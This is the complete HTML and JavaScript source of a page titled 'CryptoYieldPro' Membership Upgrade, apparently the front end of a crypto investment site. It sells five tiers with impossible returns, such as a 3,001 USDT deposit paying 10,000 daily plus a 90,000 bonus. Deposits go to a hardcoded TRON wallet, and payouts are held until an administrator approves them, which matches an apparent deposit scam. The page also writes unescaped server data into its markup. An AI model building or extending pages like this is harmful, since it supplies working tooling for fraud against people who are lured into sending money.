<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Membership Upgrade - CryptoYieldPro</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<style>
  :root{
    --bg:#040407; --card:#0f0f14; --muted:#9aa3b2; --accent:#a855f7; --accent2:#5eead4;
    --glass: rgba(255,255,255,0.03);
  }
  *{box-sizing:border-box}
  body{margin:0;min-height:100vh;background:linear-gradient(180deg,#030305 0%, #07070b 100%);font-family:Inter,system-ui,Segoe UI,Roboto,Arial;color:#eaf3ff}
  .wrap{max-width:1100px;margin:28px auto;padding:20px}
  h1{font-size:clamp(1.6rem,4vw,2.2rem); margin:6px 0 18px; background:linear-gradient(90deg,#a855f7,#5eead4); -webkit-background-clip:text; background-clip:text; color:transparent}
  .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
  @media(max-width:980px){ .grid{grid-template-columns:repeat(2,1fr)} }
  @media(max-width:640px){ .grid{grid-template-columns:1fr} }

  .card {
    background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
    border-radius:18px;
    padding:18px;
    position:relative;
    overflow:hidden;
    border:1px solid rgba(255,255,255,0.04);
    transition:transform .28s cubic-bezier(.2,.9,.3,1), box-shadow .28s;
    cursor:default;
  }
  .card:hover{ transform: translateY(-8px) scale(1.02); box-shadow: 0 20px 50px rgba(0,0,0,0.6) }
  .neon { box-shadow: 0 0 30px rgba(168,85,247,0.08), inset 0 1px 0 rgba(255,255,255,0.02) }
  .titleRow{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
  .tier{font-weight:800;font-size:1.35rem}
  .price{font-weight:700;color:#fff}
  .desc{color:var(--muted);font-size:13px;margin-bottom:12px}
  .pill{display:inline-block;padding:6px 10px;border-radius:999px;font-weight:700;font-size:12px}
  .purchase{display:flex;gap:8px;align-items:center;margin-top:auto}
  .btn{
    background:linear-gradient(90deg,var(--accent),var(--accent2));
    border:none;color:#021;padding:10px 12px;border-radius:12px;font-weight:800;cursor:pointer;
    transition:transform .12s;
  }
  .btn:hover{transform:scale(1.03)}
  .ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--muted);padding:8px 10px;border-radius:10px;cursor:pointer}
  .badgelabel{position:absolute;right:12px;top:12px;padding:6px 10px;border-radius:10px;background:linear-gradient(90deg,#ff6fb3,#7c3aed);font-weight:700;color:#fff;font-size:12px}

  .disabledBtn {
    opacity: 0.55;
    pointer-events: none;
    filter: grayscale(0.2);
  }

  /* Modal */
  .modal{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,0.7);z-index:9999}
  .modal.show{display:flex}
  .modal-card{width:95%;max-width:520px;background:#0b0b0d;padding:20px;border-radius:14px;border:1px solid rgba(255,255,255,0.04)}
  .modal h2{margin:0 0 12px}
  .qr{width:200px;height:200px;background:#fff;border-radius:12px;display:flex;align-items:center;justify-content:center;margin:10px auto;overflow:hidden}
  .addr{word-break:break-all;background:#07070b;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);text-align:center}
  .small{font-size:13px;color:var(--muted)}
  .count{font-weight:800;color:var(--accent);margin-top:8px;text-align:center}

  /* membership + wallet boxes */
  .sidebar{margin-top:20px;padding:16px;border-radius:12px;background:linear-gradient(180deg,#07070b,#0d0d10);border:1px solid rgba(255,255,255,0.03)}
  .row{display:flex;justify-content:space-between;gap:8px;align-items:center;margin-top:10px}

  .status {padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.02);}

  /* subtle animated shine */
  .card::after{content:'';position:absolute;left:-40%;top:-20%;width:60%;height:140%;transform:rotate(25deg);background:linear-gradient(90deg,rgba(255,255,255,0.02),rgba(255,255,255,0.06),rgba(255,255,255,0.02));opacity:0;transition:opacity .45s}
  .card:hover::after{opacity:1}
</style>
</head>
<body>
<div class="wrap">
  <h1>Membership Upgrade</h1>

  <div class="grid" id="tierGrid"></div>

  <div style="margin-top:20px;display:flex;gap:18px;flex-wrap:wrap">
    <div class="sidebar" id="membershipBox" style="flex:1;min-width:280px">
      <div style="display:flex;justify-content:space-between;align-items:center">
        <div>
          <div class="small">Your Membership</div>
          <div id="memStatus" style="font-weight:800">Loading...</div>
        </div>
        <div id="memBadge" class="pill pending">—</div>
      </div>
      <div id="memDetails" class="small" style="margin-top:10px">—</div>
    </div>

    <div class="sidebar" style="width:320px;min-width:240px">
      <div class="small">Your Wallet</div>
      <div id="wallet" style="font-weight:800;margin-top:6px">Loading...</div>
      <div style="height:10px"></div>
      <div class="small">Quick notes</div>
      <div class="small" style="margin-top:8px;color:var(--muted)">
        Membership payments are PENDING until admin approves. Once approved, daily payouts start.
      </div>
    </div>
  </div>
</div>

<!-- modal -->
<div id="modal" class="modal" aria-hidden="true">
  <div class="modal-card">
    <button id="closeModal" class="ghost" style="float:right">Close</button>
    <h2 id="modalTitle">Purchase</h2>

    <div style="margin-top:8px">
      <label class="small">Select coin</label>
      <select id="coinSel" style="width:100%;padding:10px;border-radius:10px;margin-top:6px;background:#07070b;border:1px solid rgba(255,255,255,0.03);color:#fff">
        <option value="USDT">USDT (TRC-20)</option>
        <option value="BTC">BTC</option>
        <option value="ETH">ETH</option>
      </select>
    </div>

    <div id="qrArea" style="text-align:center;margin-top:12px">
      <div class="qr" id="qrBox">QR</div>
      <div class="addr small" id="addrBox">Address</div>
      <div class="count small" id="amountBox">Amount: —</div>
    </div>

    <div style="display:flex;gap:8px;margin-top:16px;justify-content:center">
      <button id="createDeposit" class="btn">Purchase Membership</button>
      <button id="checkStatus" class="ghost">Check Status</button>
    </div>

    <div id="txInfo" class="small" style="margin-top:12px"></div>
  </div>
</div>

<script>
// CONFIG
const API_BASE = window.location.origin;
const WALLET_ADDR_TRON = "TAx9KbxS2qh7mwafC3VX6gCGJP8tWVaK9R";

const TIERS = {
  V1: { deposit: 51, daily:10, days:5, bonus:50, label:'V1' },
  V2: { deposit: 1498.5, daily:100, days:7, bonus:3000, label:'V2' },
  V3: { deposit: 3001, daily:10000, days:10, bonus:90000, label:'V3' },
  V4: { deposit: 29998.5, daily:50000, days:15, bonus:300000, label:'V4' },
  V5: { deposit: 50001, daily:75000, days:30, bonus:500000, label:'V5' }
};

let selectedTier = null;
let pendingTxByTier = {};
let pollTimer = null;
let pollingTier = null;

// DOM
const tierGrid = document.getElementById('tierGrid');
const modal = document.getElementById('modal');
const modalTitle = document.getElementById('modalTitle');
const closeModal = document.getElementById('closeModal');
const coinSel = document.getElementById('coinSel');
const qrBox = document.getElementById('qrBox');
const addrBox = document.getElementById('addrBox');
const amountBox = document.getElementById('amountBox');
const createDepositBtn = document.getElementById('createDeposit');
const checkStatusBtn = document.getElementById('checkStatus');
const txInfo = document.getElementById('txInfo');
const memStatus = document.getElementById('memStatus');
const memDetails = document.getElementById('memDetails');
const memBadge = document.getElementById('memBadge');
const walletEl = document.getElementById('wallet');

// LOGIN CHECK
(async function ensureLogin(){
  try {
    const res = await fetch(`${API_BASE}/api/profile`, { credentials:'include' });
    if (res.status === 401) return location.href="login.html";

    const j = await res.json();
    renderProfile(j.user);
    renderCards();

  } catch (err){
    location.href="login.html";
  }
})();

// RENDER CARDS
function renderCards(){
  tierGrid.innerHTML = '';
  Object.keys(TIERS).forEach(k=>{
    const t = TIERS[k];
    const hasPending = pendingTxByTier[k];
    const disabled = hasPending ? "disabled disabledBtn" : "";

    const div = document.createElement('div');
    div.className = 'card neon';
    div.innerHTML = `
      <div class="badgelabel">${t.label}</div>
      <div class="titleRow">
        <div class="tier">${t.label}</div>
        <div class="price">${t.deposit.toLocaleString()} USDT</div>
      </div>

      <div class="desc">Daily <strong>${t.daily.toLocaleString()}</strong> · ${t.days} days · Bonus ${t.bonus.toLocaleString()}</div>

      <div class="purchase">
        <button class="btn ${disabled}" id="buy_${k}" data-tier="${k}">Purchase</button>
        <button class="ghost" onclick="alert('Daily ${t.daily}, Days ${t.days}, Bonus ${t.bonus}')">Details</button>
      </div>

      ${hasPending ? `<div class="small" style="color:#facc15;margin-top:8px;">Pending payment for ${k}</div>` : ""}
    `;

    tierGrid.appendChild(div);
    const btn = div.querySelector(`#buy_${k}`);
    if(btn) btn.onclick = ev => onPurchaseClick(k,ev);
  });
}

// PURCHASE CLICK
function onPurchaseClick(tier, ev){
  ev.stopPropagation();
  selectedTier = tier;

  const cfg = TIERS[tier];
  modalTitle.innerText = `Purchase ${tier} — Pay ${cfg.deposit} USDT`;
  coinSel.value = 'USDT';
  amountBox.innerText = `Amount: ${cfg.deposit} USDT`;
  updateQRandAddr();
  txInfo.innerText="";

  if(pendingTxByTier[tier]){
    createDepositBtn.classList.add('disabledBtn');
    createDepositBtn.disabled = true;
  } else {
    createDepositBtn.classList.remove('disabledBtn');
    createDepositBtn.disabled = false;
  }

  modal.classList.add('show');
}

// UPDATE QR
function updateQRandAddr(){
  const coin = coinSel.value;
  if(coin==='USDT'){
    const qr = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=tron:${WALLET_ADDR_TRON}`;
    qrBox.innerHTML = `<img src="${qr}" style="width:100%;height:100%;object-fit:contain">`;
    addrBox.innerText = WALLET_ADDR_TRON;
  }
  else{
    addrBox.innerText = coin === 'BTC' ? "Your_BTC_Address" : "Your_ETH_Address";
  }
}
coinSel.addEventListener('change', updateQRandAddr);

// CLOSE MODAL
closeModal.onclick = ()=> { modal.classList.remove('show'); stopPolling(); }

// CREATE DEPOSIT
createDepositBtn.onclick = async ()=>{
  if(!selectedTier) return;

  if(pendingTxByTier[selectedTier]){
    txInfo.innerText = "You already created a pending payment.";
    return;
  }

  createDepositBtn.disabled = true;
  createDepositBtn.innerText="Purchasing...";

  const coin = coinSel.value;
  const amount = TIERS[selectedTier].deposit;

  try{
    const res = await fetch(`${API_BASE}/api/deposit`, {
      method:'POST',
      credentials:'include',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({
        coin,amount,
        membershipTier:selectedTier,
        isMembership:true
      })
    });

    const data = await res.json();
    if(!res.ok) throw new Error(data.error);

    const txId = data.txId;
    pendingTxByTier[selectedTier] = txId;
    txInfo.innerHTML = `Pending tx created.<br>Tx: ${txId}`;
    renderCards();

    startPollingFor(txId, selectedTier);

  }catch(err){
    txInfo.innerText = err.message;
  }

  createDepositBtn.disabled = false;
  createDepositBtn.innerText="Purchase Membership";
};

// MANUAL CHECK
checkStatusBtn.onclick = ()=> checkStatus();

// POLLING
function startPollingFor(txId, tier){
  stopPolling();
  pollingTier = tier;
  pollTimer = setInterval(()=> checkStatus(txId,tier), 8000);
  checkStatus(txId,tier);
}
function stopPolling(){ if(pollTimer){ clearInterval(pollTimer); pollTimer=null; }}

// VERIFY PAYMENT
async function checkStatus(txId=null, tier=null){
  if(!txId){
    if(!pollingTier) return;
    tier = pollingTier;
    txId = pendingTxByTier[tier];
  }
  if(!txId) return;

  const res = await fetch(`${API_BASE}/api/verify-payment`,{
    method:'POST',
    credentials:'include',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({txId})
  });

  const data = await res.json();

  if(data.status==='CONFIRMED'){
    txInfo.innerHTML = `<span style="color:#7ef6b8;font-weight:800">✓ Admin confirmed ${tier}</span>`;
    delete pendingTxByTier[tier];
    stopPolling();
    renderCards();
    refreshProfile();
    setTimeout(()=> modal.classList.remove('show'),1200);
  }
  else if(data.status==='PENDING'){
    txInfo.innerText = `Status: Pending (${tier})`;
  }
  else if(data.status==='DECLINED'){
    txInfo.innerText = `Declined for ${tier}`;
    delete pendingTxByTier[tier];
    stopPolling();
    renderCards();
  }
}

// PROFILE
async function refreshProfile(){
  const res = await fetch(`${API_BASE}/api/profile`, {credentials:'include'});
  const j = await res.json();
  renderProfile(j.user);
}

function renderProfile(user){
  walletEl.innerText = (user.balance||0).toFixed(2)+" USD";

  const m = user.membership;
  if(!m){
    memStatus.innerText = "No active membership";
    memDetails.innerText = "Purchase a membership to begin earning.";
    memBadge.innerText = "NONE";
    return;
  }

  memStatus.innerText = `${m.tier} — ${m.status}`;
  memBadge.innerText = m.status.toUpperCase();

  memDetails.innerHTML=`
    Started: ${m.startDate?new Date(m.startDate).toLocaleString():'—'}<br>
    Days Paid: ${m.daysPaid}/${m.durationDays}<br>
    Daily: ${m.dailyAmount} USD<br>
    Bonus Paid: ${m.bonusPaid?'Yes':'No'}
  `;
}

</script>
</body>
</html>
